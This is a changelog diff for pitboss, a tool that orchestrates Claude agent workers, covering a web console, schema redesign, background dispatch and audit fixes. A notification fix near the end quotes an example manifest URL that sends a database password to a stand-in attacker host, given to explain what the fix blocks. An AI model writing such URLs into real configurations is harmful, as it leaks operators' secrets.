+- Pitboss schema + auto-generated docs/manifest-map.md ([#127](https://github.com/SDS-Mode/pitboss/pull/127))
+- FieldMetadata derive — per-field labels, help, form_type, enum_values ([#126](https://github.com/SDS-Mode/pitboss/pull/126))
+- V0.9 schema redesign — single canonical [lead], renames, validate guidance ([#123](https://github.com/SDS-Mode/pitboss/pull/123))
+- External MCP injection + validate promptless lead + AGENTS.md ([#122](https://github.com/SDS-Mode/pitboss/pull/122))
+- Completed page + compact tiles + nit fixes ([#117](https://github.com/SDS-Mode/pitboss/pull/117))
+
 
 ### Fixed
 
-- **`pitboss-cli::runs::runs_base_dir()` is now macOS-aware.** Resolves
-  via `dirs::data_dir()` (Linux: `~/.local/share/pitboss/runs`; macOS:
-  `~/Library/Application Support/pitboss/runs`) with a back-compat
-  fallback to the legacy `$HOME/.local/share/pitboss/runs` if the
-  canonical dir doesn't exist yet but the legacy one does. The TUI,
-  the web console, and the CLI now share a default base on macOS
-  without operators having to pass `--runs-dir`. `pitboss diff`'s
-  internal `runs_base_dir` shim was deleted in favour of the canonical
-  one. `dirs` added as a direct dep of `pitboss-cli` (already a
-  workspace dep used by `pitboss-web`).
+- Close all 12 #153 audit items (3 medium + 9 low) ([#168](https://github.com/SDS-Mode/pitboss/pull/168))
+- Close out #152 audit tracker (7 items) ([#167](https://github.com/SDS-Mode/pitboss/pull/167))
+- Close out #155 and #156 audit trackers ([#166](https://github.com/SDS-Mode/pitboss/pull/166))
+- Pitboss-schema + pitboss-schema-derive audit follow-ups ([#165](https://github.com/SDS-Mode/pitboss/pull/165))
+- Runs.rs socket-path double-nesting + #157 audit follow-ups ([#164](https://github.com/SDS-Mode/pitboss/pull/164))
+- Unblock container-dispatch hierarchical manifests + audit cleanup ([#163](https://github.com/SDS-Mode/pitboss/pull/163))
+- Redact webhook secrets in errors + tighten SSRF blocklist ([#162](https://github.com/SDS-Mode/pitboss/pull/162))
+- Process-group signaling + immediate PID slot clear (#147 #148) ([#161](https://github.com/SDS-Mode/pitboss/pull/161))
+- Authz hardening — token-bound identity + cross-layer writes (#144, #145, #146) ([#160](https://github.com/SDS-Mode/pitboss/pull/160))
+- Completed page UX fixes + log pane text leakage ([#120](https://github.com/SDS-Mode/pitboss/pull/120))
+- Address bugs #104 #105 #106 #107 ([#119](https://github.com/SDS-Mode/pitboss/pull/119))
+- Remove scroll-up-at-top exits-Detail gesture (#114 follow-up) ([#115](https://github.com/SDS-Mode/pitboss/pull/115))
+- Scroll-to-zoom into Detail + bottom-anchor focus log preview ([#114](https://github.com/SDS-Mode/pitboss/pull/114))
+- Replay bridge-held approvals on TUI reconnect ([#103](https://github.com/SDS-Mode/pitboss/pull/103))
 
-### Added
-
-- **Web operational console — tile grid + Svelte Flow run-tree graph**
-  (cross-cutting items from the planning doc, the visual layer that
-  pushes the console past TUI parity).
-  - `RunTileGrid`: TUI Normal-view-equivalent in the browser. One
-    color-coded tile per worker (border + bg keyed off `state` /
-    `failure`), grouped by `parent_task_id` (children indent under
-    parents). Tiles fold in store-op counters (`StoreActivity`),
-    failure reasons (`WorkerFailed`), and sublead metadata
-    (`SubleadSpawned`). Inline pause / continue / reprompt / cancel
-    buttons. Replaces the old workers table on the Live tab.
-  - `RunGraph` (`@xyflow/svelte` + `@dagrejs/dagre`): zoomable,
-    pannable, mini-map-equipped graph laid out top-to-bottom by
-    Dagre. Custom node shows status-coloured tile with kv/lease
-    counts; edges are animated when the child worker is `running`.
-    Exposed as a new "Graph" tab next to "Live" on every in-progress
-    run. Doesn't compete with the TUI tile grid — it shows the
-    *hierarchy* the TUI fundamentally cannot render.
-  - Aggregation: the SSE ingest function now also tracks per-actor
-    store activity, per-task failure reasons, and per-sublead
-    metadata (budget / max workers / read-down + terminal outcome).
-    None of it round-trips to disk; reload rebuilds from the next
-    `Hello` + `WorkersSnapshot` pair. Shared types
-    (`WorkerEntry` / `ActorActivity` / `SubleadInfo` / `FailureReason`)
-    live in `lib/api.ts` so the tile grid and graph render off the
-    exact same shape.
-  - Deps added (SPA only): `@xyflow/svelte ^1.5.2` (Svelte 5
-    compatible), `@dagrejs/dagre ^3`.
-
-- **Web operational console — Phase 4 + 5** (manifest authoring, dispatch
-  from console, fork from completed runs). The browser is now a complete
-  authoring surface: write a manifest, validate as you type, save to the
-  workspace, dispatch in the background, watch the run go live, and fork
-  the snapshot back into a new manifest with one button.
-  - Backend (all sandboxed to `state.manifests_dir()`):
-    - `GET  /api/schema` — full `SchemaSection` tree as JSON. Comes for
-      free off the existing `pitboss-schema-derive` `field_metadata()`
-      slices; no schema work required.
-    - `GET  /api/manifests` — list TOML files in the workspace
-      (sorted by mtime, newest first).
-    - `GET  /api/manifests/:name` — read one manifest's raw TOML.
-    - `POST /api/manifests` — save (create or overwrite) a manifest.
-    - `POST /api/manifests/validate` — runs `load_manifest_from_str` +
-      `validate_skip_dir_check` against the body and returns the same
-      error chain the CLI emits, flattened into a JSON array.
-    - `POST /api/runs` — execs `pitboss dispatch --background <path>`
-      (binary path overridable via `PITBOSS_BIN`), parses the JSON
-      descriptor the dispatcher prints, and returns it. The SPA uses
-      `descriptor.run_id` to redirect to the live run page.
-    - `POST /api/runs/:id/fork` — copies the run's
-      `manifest.snapshot.toml` into the workspace under a new name.
-      Refuses to overwrite existing manifests.
-  - Sandbox: `sanitize_manifest_name()` rejects path separators, `..`,
-    overlong / non-ASCII names, then forces a `.toml` suffix. 256 KiB
-    upper bound on manifest body size.
-  - SPA: new `/manifests` route lists the workspace and creates new
-    manifests from a stub. `/manifests/[name]` is a TOML editor with
-    debounced validate-on-keystroke (600 ms), Save and Dispatch
-    buttons; Dispatch saves first if the buffer is dirty, then
-    redirects to the run page on success.
-  - SPA: "Fork manifest" button on every run-detail page (live or
-    completed). Prompts for a new name, POSTs the fork, jumps straight
-    into the editor.
-  - Site header: "Manifests" nav link added next to "Runs".
-
-- **Web operational console — Phase 3** (control writes). The bridge
-  now retains the per-run socket's write half so REST callers can push
-  `ControlOp` messages to the live dispatcher. The SPA exposes the
-  full TUI control surface in the browser.
-  - `POST /api/runs/{id}/control` accepts a JSON-tagged `ControlOp`
-    body (`cancel_worker`, `cancel_run`, `pause_worker`,
-    `continue_worker`, `reprompt_worker`, `approve`, `update_policy`).
-    Returns `202 Accepted` on flush; the dispatcher's `OpAcked` /
-    `OpFailed` reply is delivered out-of-band on the SSE stream. The
-    server-only `hello` op is rejected up front.
-  - Bridge: `ControlBridge::send_op(run_id, op)` auto-connects the
-    socket on first call and serialises writes through a per-run
-    `Arc<Mutex<OwnedWriteHalf>>`, so concurrent SPA tabs cannot
-    interleave bytes.
-  - Auth: `require_token` middleware now also accepts `?token=` as a
-    query-param. Required for the SSE `/events` route — `EventSource`
-    has no header API. The SPA only sends the token on SSE; everything
-    else still uses the `Authorization: Bearer …` header.
-  - SPA Live tab: `Cancel run` button, per-worker action menu
-    (pause / continue / reprompt / cancel), live workers table built
-    from `WorkersSnapshot` events, and an inline op-feedback banner
-    driven by `OpAcked` / `OpFailed` / `OpUnknownState` events.
-  - SPA approval modal: `ApprovalRequest` events auto-pop a dialog
-    rendering the summary, plan rationale / resources / risks /
-    rollback. Operator can approve (with optional edited summary +
-    comment) or deny (with reason); the response POSTs `approve`.
-    Multiple in-flight requests queue and surface one at a time.
-  - SPA policy editor: collapsible card on the Live tab seeded from
-    the dispatcher's `Hello.policy_rules`. JSON-textarea editor for
-    each rule (schema-driven form is Phase 4); `Save policy` POSTs
-    `update_policy`. Re-seeds when the dispatcher pushes a fresh
-    Hello (e.g. on take-over).
-  - Take-control banner: `Superseded` events from the dispatcher
-    surface as an amber notice ("another client took control") and
-    disable the action buttons until the operator dismisses it.
-  - Tests: new `bridge_send_op_round_trips_through_dispatcher` and
-    `bridge_send_op_rejects_client_hello` integration tests. Existing
-    bridge multiplex / connect tests still pass.
-
-- **Web operational console — Phase 1** (`pitboss-web` crate, new
-  workspace member). Single-binary axum HTTP server + embedded SvelteKit
-  SPA. Read-only post-run archaeology over the runs filesystem; live
-  control-socket bridging is Phase 2 (in progress on the same branch).
-  - Backend: `GET /api/runs`, `/api/runs/{id}` (with synthesised stub
-    for in-progress runs), `/api/runs/{id}/manifest`,
-    `/api/runs/{id}/resolved`, `/api/runs/{id}/summary-jsonl`,
-    `/api/runs/{id}/tasks/{task_id}/log` (with `?limit` + `?tail`
-    controls). Bearer-token auth, loopback-default bind, mandatory
-    token when binding non-loopback.
-  - Frontend: SvelteKit 2 + Svelte 5 + adapter-static + Tailwind v4 +
-    shadcn-svelte (bits-ui v2). Run list with color-coded status
-    badges, run detail with KPI cards + tabs (Tasks / Manifest /
-    Resolved / Summary), per-task log viewer with tail/head toggle.
-  - Path config: `--runs-dir` / `--manifests-dir` flags plus matching
-    `PITBOSS_RUNS_DIR` / `PITBOSS_MANIFESTS_DIR` env vars. Defaults
-    flow through `pitboss_cli::runs::runs_base_dir()` so the console
-    auto-tracks any future macOS-aware fix to that function. Manifests
-    workspace defaults via `dirs::data_dir()` (Linux: `~/.local/share`,
-    macOS: `~/Library/Application Support`).
-  - No changes to existing crates — `pitboss-cli` already exposed
-    `runs::*` and `control::protocol::*` as `pub` modules via its
-    `lib.rs`, so the web crate consumes them directly.
-  - Build: `cd crates/pitboss-web/spa && npm install && npm run build`,
-    then `cargo build -p pitboss-web`. The placeholder fallback HTML
-    keeps the binary runnable when the SPA bundle isn't built yet, so
-    backend smoke tests don't require a node toolchain.
-
-### Changed (breaking, pre-v1)
-
-- **Manifest TOML schema redesign (v0.9)** — collapses the v0.8
-  `[[lead]]`/`[lead]` split into one canonical `[lead]` (single-table) form,
-  moves lead-level caps off `[run]` onto `[lead]` (where they semantically
-  belong), promotes `[lead.sublead_defaults]` to top-level
-  `[sublead_defaults]`, and renames a few fields for consistency. The
-  redesign is informed by n8n form-input patterns: a single linear shape
-  that a form-builder can render without "this section is either an array
-  or a singleton" branching.
-
-  | v0.8 form | v0.9 form |
-  |---|---|
-  | `[[lead]]` (array) | `[lead]` (single-table) |
-  | `[run].max_workers` | `[lead].max_workers` |
-  | `[run].budget_usd` | `[lead].budget_usd` |
-  | `[run].lead_timeout_secs` | `[lead].lead_timeout_secs` |
-  | `[run].max_parallel` | `[run].max_parallel_tasks` |
-  | `[run].approval_policy` | `[run].default_approval_policy` |
-  | `[lead].max_workers_across_tree` | `[lead].max_total_workers` |
-  | `[lead.sublead_defaults]` | top-level `[sublead_defaults]` |
-  | `[lead].id`, `[lead].directory` optional | both required |
-
-  `pitboss validate` recognises pre-v0.9 manifests and reports each
-  renamed/moved field as a single migration block (rather than bailing on
-  the first generic "unknown field" error). In-flight runs (`resolved.json`
-  snapshots) remain readable — `#[serde(alias)]` on the renamed fields
-  preserves resume.
-
-  The internal `Manifest` and `SingleLeadManifest` types collapsed into one
-  canonical `Manifest`. `ResolvedManifest` field names were renamed to mirror
-  the TOML (`max_parallel_tasks`, `default_approval_policy`,
-  `max_total_workers`).
-
-### Added
-
-- **`pitboss dispatch --background`** — `nohup`-equivalent, non-blocking
-  dispatch (issue #133-C). The parent process pre-mints a `run_id`,
-  spawns the dispatcher as a session-leader child (`setsid()` via
-  `pre_exec`, stdio nulled), prints a single JSON line on stdout, and
-  exits 0 — without waiting for the run to complete:
-
-  ```
-  $ pitboss dispatch --background ./manifest.toml
-  {"run_id":"019d…","manifest_path":"./manifest.toml","started_at":"2026-04-26T17:00:00Z","child_pid":12345}
-  $
-  ```
-
-  Designed for orchestrators (Discord bots, web dashboards, CI scripts)
-  that need to dispatch a manifest and return to availability immediately
-  rather than tie up an event loop for the duration of the run. Concrete
-  example from issue #133: a Discord bot's `/dispatch <manifest>` slash
-  command can now hand the manifest off and respond to the user in
-  milliseconds; the run grinds in the background and reports back via
-  `[lifecycle].notify` (PR #137) or polling `pitboss list --active` /
-  `pitboss status <run_id>`.
-
-  Mode-agnostic by design: works with both flat (`[[task]]`) and
-  hierarchical (`[lead]`) manifests. The decision of whether a lead
-  claude wraps the dispatch is a manifest authoring concern (omit
-  `[lead]` to skip the lead-claude cost), kept orthogonal to this
-  flag's attached-vs-detached lifecycle concern.
-
-  Mechanism uses a hidden `--internal-run-id <UUID>` flag for the
-  parent→child handoff so the announced and on-disk run ids match
-  byte-for-byte (the standard correlation contract orchestrators
-  already rely on for `RunDispatched` / `RunFinished` webhooks).
-  `--background --dry-run` and `--background --internal-run-id` are
-  rejected at parse time as nonsensical combinations.
-
-- **`[lifecycle]` manifest section + `survive_parent` declaration** —
-  follow-up A from issue #133. Lets a manifest formally declare that this
-  dispatch should be allowed to outlive its parent process (use case: an
-  agent's `pitboss dispatch <child.toml>` from inside its task worktree
-  needs to keep running after the agent's lead claude exits or times
-  out). Two coupled controls:
-
-  ```toml
-  [lifecycle]
-  survive_parent = true
-  notify = { kind = "webhook", url = "https://orchestrator.internal/events", events = ["run_dispatched", "run_finished"] }
-  ```
-
-  The `notify` field is optional and inline (same shape as
-  `[[notification]]`); when present it's validated by the same SSRF rules
-  as the top-level form. `pitboss validate` enforces the coupling:
-  `survive_parent = true` requires AT LEAST ONE notification target
-  (inline `[lifecycle].notify` or a top-level `[[notification]]` section),
-  so the orchestrator that's losing process-level control of the run can
-  still observe its outcome. Operators delivering events solely via
-  `PITBOSS_PARENT_NOTIFY_URL` (the env-var path shipped earlier in
-  v0.10) need to declare a no-cost `kind = "log"` block to satisfy the
-  validate-time gate, since validate runs against the manifest in
-  isolation and cannot see env vars.
-
-  The inline `[lifecycle].notify` goes through the same SSRF guard as
-  `[[notification]]` (https-only, no loopback). For loopback orchestrator
-  delivery, use `PITBOSS_PARENT_NOTIFY_URL` — that env-var path is
-  operator-trusted and bypasses the manifest-author SSRF guard for
-  exactly that case.
-
-  The `RunDispatched` event payload now carries `survive_parent: bool`
-  so the orchestrator can decide whether to include this run's process
-  group in any cancel-tree-walk it performs:
-
-  ```json
-  {
-    "kind":           "run_dispatched",
-    "run_id":         "019d...",
-    "parent_run_id":  "019c...",
-    "manifest_path":  "/work/child.toml",
-    "mode":           "flat",
-    "survive_parent": true
-  }
-  ```
-
-  No actual cancel-cascade behavior change ships in this PR — the
-  manifest declares intent; how the orchestrator acts on it (tree-walk
-  exclusion, signal handling) is the orchestrator's call. The
-  RacerX-side plumbing for tree-walk exclusion is tracked separately.
-
-- **`pitboss list [--active] [--json]`** — flat-CLI inventory of recent runs
-  under `~/.local/share/pitboss/runs/`. Mirrors the `pitboss-tui list`
-  output but without depending on the TUI binary, so orchestrators (RacerX,
-  CI scripts, dashboards) can shell out to it directly. `--active` narrows
-  to runs whose dispatcher is alive right now (`status = running`); use
-  `pitboss prune --dry-run` to surface stale / orphaned entries instead.
-  `--json` emits a stable record array — `{run_id, run_dir, started_at,
-  tasks_total, tasks_failed, status}` — suitable for piping through `jq`
-  or consuming from a wrapping process. Companion to the parent-notify
-  hook (also #133): notifications give push observability, `pitboss list`
-  gives pull.
-
-- **Parent-orchestrator notification hook** — closes issue #133. Two new
-  env vars give a wrapping orchestrator (Discord bot, dispatcher service,
-  CI runner) visibility into runs the agent itself spawns from inside its
-  task worktree, without requiring manifest cooperation.
-
-  - `PITBOSS_PARENT_NOTIFY_URL` — when set, every `pitboss dispatch`
-    invocation builds an ephemeral webhook sink targeting that URL and
-    emits at run start (`RunDispatched`) and run end (`RunFinished`).
-    Runs alongside any manifest-declared `[[notification]]` sinks. The
-    env-var sink bypasses the manifest-path SSRF guards (which reject
-    loopback / private IPs) because the canonical orchestrator topology
-    is `http://localhost:N` on the same host, and only the operator
-    running pitboss can set the env var — a hostile manifest cannot.
-
-  - `PITBOSS_RUN_ID` — set automatically by every `pitboss dispatch` to
-    its own run uuid. Standard env-var inheritance propagates the value
-    into spawned claude subprocesses; if claude (or any descendant) runs
-    `pitboss dispatch <child.toml>`, that nested invocation reads the
-    inherited value and reports it as `parent_run_id` on the child's
-    `RunDispatched` event so the orchestrator can correlate parent ↔
-    child runs.
-
-  Concrete shape of the new event:
-
-  ```json
-  {
-    "kind": "run_dispatched",
-    "run_id":        "019d...",
-    "parent_run_id": "019c...",
-    "manifest_path": "/work/child.toml",
-    "mode":          "flat"
-  }
-  ```
-
-  Also fixes an existing bug: hierarchical mode built the notification
-  router but never fired `RunFinished`. Both flat and hierarchical now
-  emit it consistently.
-
-  `run_dispatched` is added to the `[[notification]] events = [...]`
-  allowlist so operators can subscribe via the manifest path too.
-
-- **`final_message` field on `TaskRecord`** — sibling to the existing
-  `final_message_preview` (still capped at 200 chars for layout-friendly
-  displays), carrying the untruncated assistant final message. Closes
-  issue #124. Previously, consumers reading `summary.json` for the assistant's
-  reply silently received ~14% of the actual content (a 1478-char message
-  would land in the JSON as 200 chars + ellipsis), forcing them to fall back
-  to parsing the per-task `stdout.log` stream-json for the terminal `result`
-  event. Now the dispatcher writes both the preview (for tables and chat
-  embeds) and the full text. SQLite store gains a `final_message TEXT NULL`
-  column with an idempotent `migrate_final_message` migration; pre-v0.10
-  databases and `summary.json` files continue to deserialize cleanly with
-  the field defaulting to `None`.
-
-- **`pitboss tree <manifest> [--check <USD>]`** — pre-flight
-  visualisation + cost gate. Prints the dispatch topology (root
-  lead, depth-2 controls, `[sublead_defaults]`, OR the flat-mode
-  task list) alongside every per-actor knob the operator is
-  implicitly committing to (model, effort, timeout, worker pool,
-  per-actor budget). Aggregates the worst-case budget envelope
-  (root lead pool + `max_subleads × max_sublead_budget_usd`,
-  assuming `read_down = false` for every sub-lead since that's the
-  conservative assumption a static manifest can make).
-
-  `--check <USD>` turns the same walk into a hard gate: exits 1
-  if the aggregate exceeds the threshold OR if a required cap is
-  unbounded (e.g. `allow_subleads = true` without
-  `max_sublead_budget_usd`). Drop into a CI workflow before
-  `pitboss dispatch` to fail loudly before any spend lands.
-
-  Loads via `load_manifest_from_str`, so it accepts manifests with
-  placeholder paths (e.g. fresh `pitboss init` output) — the gate
-  is about cost intent, not deployment readiness.
-
-- **`pitboss prune` subcommand** — sweep orphaned run directories.
-  Targets `Stale` runs by default (the v0.9 classifier state added in
-  the previous release), with `--include-aborted` to also clean up
-  runs that never produced any output. Two actions: synthesize a
-  Cancelled `summary.json` (default — preserves the partial state in
-  `summary.jsonl` so the run is still inspectable / resumable) or
-  remove the run directory entirely with `--remove` (also unlinks the
-  leftover `$XDG_RUNTIME_DIR/pitboss/<id>.control.sock` file).
-
-  Defaults to dry-run; `--apply` commits the action. `--older-than
-  24h` filters by mtime so a fresh `kill -KILL` two minutes ago
-  doesn't get swept while you're still investigating; accepts `60s`,
-  `30m`, `4h`, `1d`, or a bare number of seconds. Exits non-zero if
-  any candidate's action failed (so CI / shell loops can detect
-  partial success). `--runs-dir <PATH>` overrides the default base
-  for testing or non-standard layouts.
-
-  Replaces the manual cleanup recipe of `rm -rf
-  ~/.local/share/pitboss/runs/<id>` plus
-  `rm /run/user/$(id -u)/pitboss/<id>-*.sock` — fine for an operator
-  who knows the layout, but the built-in subcommand makes the
-  lifecycle legible and scriptable.
-
-- **Run-list `Stale` state + connect-based liveness probe** — the run
-  classifier now distinguishes a fourth state, `Stale`, for runs whose
-  control socket no longer accepts connections AND whose
-  `summary.jsonl` has not been written within the last 4 hours
-  (configurable via the `STALENESS_THRESHOLD` constant). Previously
-  the v0.8 classifier treated *any* run with a socket file present as
-  `Running`, which left orphans from `kill -KILL`/OOM/crash visible
-  as live for as long as the abstract socket file persisted. The
-  probe is now a real `UnixStream::connect()` — dead sockets return
-  ECONNREFUSED almost instantly, so the classifier costs no more
-  than before.
-
-  Surfaces in `pitboss-tui list` and the run picker as the new label
-  `stale`. Pairs naturally with the upcoming `pitboss prune`
-  subcommand, which will match on this state by default.
-
-  Internal refactor: `RunStatus` / `RunEntry` / `collect_run_entries`
-  moved from `pitboss-tui::runs` to `pitboss-cli::runs` (the natural
-  home — `pitboss-tui` already depends on `pitboss-cli`). The
-  `pitboss-tui::runs` module is now a thin re-export shim so existing
-  TUI imports keep working unchanged.
-
-- **`pitboss init [output] [-t simple|full] [--force]`** — emit a starter
-  manifest TOML to stdout or a named file. Two hand-curated templates:
-  `simple` (one `[lead]` driving a flat worker pool — the 80% case) and
-  `full` (coordinator + sub-leads + workers with depth-2 controls and
-  `[sublead_defaults]` populated, plus `[[mcp_server]]` /
-  `[[approval_policy]]` / `[[template]]` / `[container]` commented at the
-  bottom for easy uncommenting). Both templates are valid v0.9 manifests
-  once placeholder paths and prompts are filled in. Refuses to overwrite
-  an existing file unless `--force` is passed. Drift-guard tests run each
-  template through `load_manifest_from_str` so a future schema change
-  that breaks a template surfaces immediately.
-
-- **`pitboss schema --format=example` + `docs/manifest-reference.toml`** —
-  auto-generates a complete reference TOML in which every field declared by
-  the v0.9 schema appears as an uncommented `key = placeholder` assignment.
-  Placeholders come from the field's inferred `FormType` (with `enum_values`
-  fields collapsing to their first variant). Companion to `--format=map`:
-  the map shows where each field lives in the source, the reference shows
-  what a fully-populated section looks like. Drift-guarded by a unit test
-  and `pitboss schema --format=example --check docs/manifest-reference.toml`
-  for CI. The output is valid TOML (parses cleanly) but is *not* a runnable
-  manifest — `[lead]` and `[[task]]` are mutually exclusive at dispatch time
-  even though both demonstrate happily side-by-side here.
-
-- **`pitboss schema --format=map` + `docs/manifest-map.md`** — auto-generates
-  a per-field code-reference doc that maps every TOML key to its Rust
-  source location (`schema.rs:LINE`), label, help text, type, and
-  required/optional state. The checked-in file is verified by a unit-test
-  drift guard plus `pitboss schema --format=map --check docs/manifest-map.md`
-  for CI/contributor use. Driven entirely by the `field_metadata()`
-  registry from the prior change — adding a new schema field with
-  `#[field(label, help)]` flows automatically into the doc on regenerate.
-  Also fixed a derive bug exposed by this work: `#[serde(default)]` /
-  `#[serde(default = "...")]` fields now correctly render as optional
-  (previously only `Option<T>` did).
-
-- **Field-metadata derive (`pitboss-schema` + `pitboss-schema-derive`)** —
-  schema structs now carry per-field metadata (label, help, form_type,
-  enum_values, required) via `#[derive(FieldMetadata)]`. `required` is
-  inferred from `Option<T>` and serde defaults; `form_type` is inferred
-  from the Rust type (`Vec<String>` → `string_list`, `PathBuf` → `path`,
-  `bool` → `boolean`, …) with explicit override via `#[field(form_type =
-  "...")]`. A central registry in `manifest::metadata::sections()` walks
-  every section in declaration order. Foundation for the upcoming
-  auto-generated TOML map doc (PR 1.C), complete-example emitter (PR 1.D),
-  `pitboss scaffold` template generator (PR 1.E), and
-  `pitboss schema --format=n8n-form` export.
-
-- **`[[mcp_server]]` — external MCP server injection** — declare external MCP
-  servers in the manifest and they are injected into every actor's
-  `--mcp-config` (lead, sub-leads, and workers) at dispatch time. Eliminates
-  the KV-bridge workaround required to give workers access to tools like
-  context7.
-
-  ```toml
-  [[mcp_server]]
-  id      = "context7"
-  command = "npx"
-  args    = ["-y", "@upstash/context7-mcp"]
-  ```
-
-  All actors receive the server (scope = all). Per-actor scoping deferred.
-
-- **`pitboss validate` detects promptless lead** — a `[lead]` block whose
-  `prompt =` key appears after a subtable declaration (e.g.
-  `[lead.sublead_defaults]`) is silently reassigned by TOML, resolving to `""`
-  at dispatch. The lead then spawns with no `-p` argument and exits in ~700ms.
-  `validate` now rejects empty or whitespace-only prompts with an explanatory
-  error that names the TOML ordering root cause.
-
-- **TUI Completed page** — tiles that have been in a terminal state for 120
-  seconds (configurable via `AppState::completed_after_secs`) are automatically
-  promoted off the Active grid to a dedicated Completed page. At 100+ workers
-  this keeps the Active view focused on live work rather than a wall of done
-  tiles. Press `C` or click the "Completed" tab to open; `A`, Esc, or
-  right-click to return to the Active view.
-
-  The Completed page is a scrollable table (`ratatui::Table`) with columns
-  TASK ID / STATUS / DURATION / TOKENS / ENDED. Navigate with `j`/`k`/`g`/`G`,
-  press Enter or click a row to open the full Detail log view (Esc returns to
-  the Completed page, not the Active grid). Press `s` to cycle sort order
-  (most-recently-finished / longest duration / status).
-
-- **Compact tile mode** — press `v` in the Active grid to toggle a 2-line
-  compact tile layout (status + token summary) instead of the default 5-line
-  tiles. Useful when monitoring many concurrent workers.
-
-- **Tab bar** — a one-line `Active (N running · M pending) | Completed (K)`
-  bar appears between the title and body whenever any tiles have been
-  promoted. Clicking a tab navigates to that page.
-
-- **`return_to` on Detail view** — `Mode::Detail` now carries a boxed
-  `return_to: Box<Mode>` field. Esc from Detail returns to whichever page
-  opened it (Active grid or Completed page) rather than always resetting
-  to Normal mode.
-
-### Changed
-
-- **Approval list pane keybinding** changed from `a` to `A` to avoid
-  collision with common vi navigation patterns.
-- **Container builds gate on CI** — the `CI` and `Container` workflows have
-  been merged into a single file. Container builds on PRs now only start after
-  `test + lint + fmt` passes, eliminating wasted arm64 runner minutes on
-  lint-failing branches.
-- **Rust toolchain pinned to 1.95.0** — `rust-toolchain.toml` and
-  `rustfmt.toml` added to keep CI and local formatting in sync and prevent
-  recurring fmt-check drift between environments.
-
-### Fixed
-
-**Shared store (#153, all 12 audit items):**
-- `shared_store::leases::LeaseRegistry::release` now returns `(released_name,
-  evicted)` instead of just the eviction list. `SharedStore::lease_release`
-  forwards the *name* (not the lease_id UUID) on `lease_notifier`, so
-  `lease_acquire` waiters can filter incoming events by the name they're
-  waiting on. Pre-fix, every release on any lease woke every waiter on
-  every other lease into a wasted retry, AND any name-filtering attempt
-  would silently fail because UUIDs never match names. (M3 + M2 — coupled,
-  cannot be fixed independently.)
-- `SharedStore::lease_acquire` wait branch — gained per-name filter on
-  the broadcast subscription (drops events whose `name != self.name` with
-  `continue` rather than retry-acquire). Eliminates the thundering herd:
-  N waiters across distinct leases used to mean O(N × release-rate) wakeups
-  per release. Now O(1) — only same-name waiters wake. `Lagged` recovery
-  remains a retry-acquire because the in-memory map is the source of
-  truth; the broadcast is a wake-up hint. (M2)
-- `SharedStore::pruner_started: AtomicBool` — set true by
-  `start_lease_pruner()`. `lease_acquire` warns once (latched via
-  `pruner_warning_logged`) when entering the wait branch without the
-  pruner running, surfacing the misconfiguration that would otherwise
-  cause silent-holder-crash waiters to block to their own deadline rather
-  than the holder's TTL. (M1)
-- `SharedStore::wait` — `min_version: Some(0)` now coerces to 1 (matches
-  the `None` branch). Pre-fix, `Some(0)` was treated as `>= 0` which
-  matches any present entry, defeating the point of the parameter when
-  callers pass a manifest-supplied version that defaults to 0. (L1)
-- `SharedStore::wait` + `lease_acquire` — `tracing::warn!` on
-  `broadcast::error::RecvError::Lagged` (with `path`/`lease_name` and
-  `skipped` count). Operators previously had no signal that the wake-up
-  channel had saturated and waiters had fallen into the slow re-read
-  path. (L7)
-- `KV_NOTIFIER_CAPACITY` raised from 256 → 1024;
-  `LEASE_NOTIFIER_CAPACITY` raised from 64 → 256. Both Lagged paths
-  remain correct, this just reduces the rate at which they fire under
-  burst load. (L2)
-- `SharedStore::lease_acquire` — Lagged recovery comment rewritten
-  to spell out *why* it's safe (retry-acquire consults the in-memory
-  map, broadcast is a hint). The audit's "may miss a relevant release"
-  concern is mitigated by that property. (L3)
-- `SharedStore::release_all_for_actor` — now carries a LOAD-BEARING
-  doc-comment marking it as bridge-disconnect-only. Adding a real auth
-  token is deferred until a second legitimate caller emerges; until
-  then, the bridge is the documented sole caller and code review is
-  the gate. (L4)
-- `RunLeaseRegistry::try_acquire` — TTL boundary changed from `<=` to
-  `<` so an exactly-at-deadline lease is treated as expired, matching
-  the `LeaseRegistry::prune_expired` convention in `leases.rs`. The
-  same-holder reacquire-as-renewal behaviour is now explicitly
-  documented as intentional (not silent). (L5)
-- `RunLeaseRegistry::acquire_with_wait` — new method that mirrors
-  `SharedStore::lease_acquire` for the run-global registry. Backed by
-  a shared `tokio::sync::Notify` poked from `release` and
-  `release_all_held_by`; subscribes-then-tries to avoid lost-wakeup
-  races. The previous `try_acquire`-only API forced callers to roll
-  their own poll loops. (L6)
-- `SharedStore::dump_to_path` — doc-comment now spells out that
-  entries and leases are read under separate locks (not a strictly
-  consistent snapshot). Acceptable for finalize-time post-mortem use
-  but not for cross-store invariants. (L8)
-- `ActivityCounters` doc — clarified bump-on-attempt semantics: bumps
-  fire at handler entry before authz/exec; mid-handler panics leave
-  the bump in place by design (one attempt = one bump). The counters
-  answer "how many calls did this actor attempt" not "how many
-  succeeded" — flipping the order would make stuck workers invisible
-  in the TUI. (L9)
-
-**Notify (manifest #156 follow-ups, audit closure):**
-- `notify::config::pre_request_ssrf_check` — now returns the validated
-  `SocketAddr` set instead of `Result<()>`, and each HTTP sink builds a
-  one-shot `reqwest::Client` with `resolve_to_addrs(host, …)` pinning the
-  destination to those exact IPs. Closes the TOCTOU window between the
-  guard's DNS lookup and reqwest's own internal lookup at `send()`-time
-  (DNS rebinding / mutable CNAME). The shared client is still used on the
-  SSRF-bypass path (`PITBOSS_PARENT_NOTIFY_URL`). (#156 M2)
-- `notify::config::ENV_VAR_ALLOWED_PREFIX` — narrowed from `PITBOSS_` to
-  `PITBOSS_NOTIFY_`. A manifest can no longer write
-  `url = "https://attacker.example/${PITBOSS_DB_PASSWORD}"` to encode a
-  pitboss-internal env var (`PITBOSS_RUN_ID`, `PITBOSS_PARENT_NOTIFY_URL`,
-  smoke-test fixtures, operator secrets) into the webhook URL. Operators
-  who need to inject a hook URL via env var rename their secret to start
-  with `PITBOSS_NOTIFY_`. **Breaking** for manifests that interpolated
-  non-`PITBOSS_NOTIFY_` env vars into a `[[notification]].url`. (#156 M3)
-- `NotificationRouter` — terminal emit failures (after-retry exhaustion +
-  fatal 4xx short-circuits) now (a) bump a `failed_emits_total` atomic
-  counter accessible via `router.failed_emits_total()`, and (b) write a
-  `TaskEvent::NotificationFailed` JSONL line to
-  `<run_subdir>/notifications.jsonl`. Both runners
-  (`dispatch::runner::dispatch` flat + `dispatch::hierarchical::dispatch`)
-  bind the run subdir to the router right after creating it. The journal
-  write is best-effort; an I/O error there is `tracing::warn`'d and
